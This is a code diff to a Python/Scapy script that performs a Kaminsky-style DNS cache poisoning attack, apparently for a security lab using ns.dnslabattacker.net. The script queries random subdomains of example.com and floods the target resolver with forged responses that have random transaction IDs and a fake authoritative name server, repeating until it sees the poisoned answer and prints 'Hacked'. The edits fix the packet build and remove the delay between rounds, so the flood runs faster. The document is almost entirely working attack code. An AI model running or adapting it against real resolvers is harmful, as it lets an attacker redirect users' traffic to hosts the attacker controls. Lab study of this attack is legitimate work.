@@ -50,11 +50,13 @@ def spamFakeResponse(target_ip, dns_port, subdomain):
     # create different TX id, combine them into the response packet
     # same fake name server ns.dnslabattacker.net
     fake = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    txid = getRandomTXID()
     QD = DNSQR(qname = subdomain)
-    AN = DNSRR(rrname = subdomain, ttl = 86400, rdata = "1.2.3.4")
+    AN = DNSRR(rrname = subdomain, ttl = 86400, type = 'A', rdata = "1.2.3.4")
     NS = DNSRR(rrname = "example.com", ttl = 86400, type='NS', rdata="ns.dnslabattacker.net")
-    response = DNS(id = txid, qr = 1, aa = 1, opcode = 0, rd = 1, qd = QD, an = AN, ns = NS, ancount = 1, nscount = 1, qdcount = 1, arcount = 0)
+    response = DNS(id = 1, qr = 1, aa = 1, opcode = 0, rd = 1, ancount = 1, nscount = 1, qdcount = 1, arcount = 0, qd = QD, an = AN, ns = NS)
+    if response.ar != None:
+        del response.ar
+    response.id = getRandomTXID()
     sendPacket(fake, response, target_ip, dns_port)
     # print("test")
 
@@ -68,12 +70,12 @@ if __name__ == '__main__':
     # 2. while the bind server is waiting, spam it with a series of fake responses with the desired fake name server
     # 3. check the response from the server actually matches what we want to achieve, close connection; if not keep repeating
     # keep in mind that there will be two NS for example.com as previous part examined
-
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
 
     while True:
         subdomain = getRandomSubDomain() + ".example.com"
-        dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdomain))
+        dnsPacket = DNS(rd=1, qd=DNSQR(qname = subdomain))
         sendPacket(sock, dnsPacket, my_ip, my_port)
         print("Queried for:", subdomain) 
 
@@ -85,5 +87,3 @@ if __name__ == '__main__':
         if response.an and response.an.rdata == "1.2.3.4":
             print("Hacked")
             break
-
-        time.sleep(1)
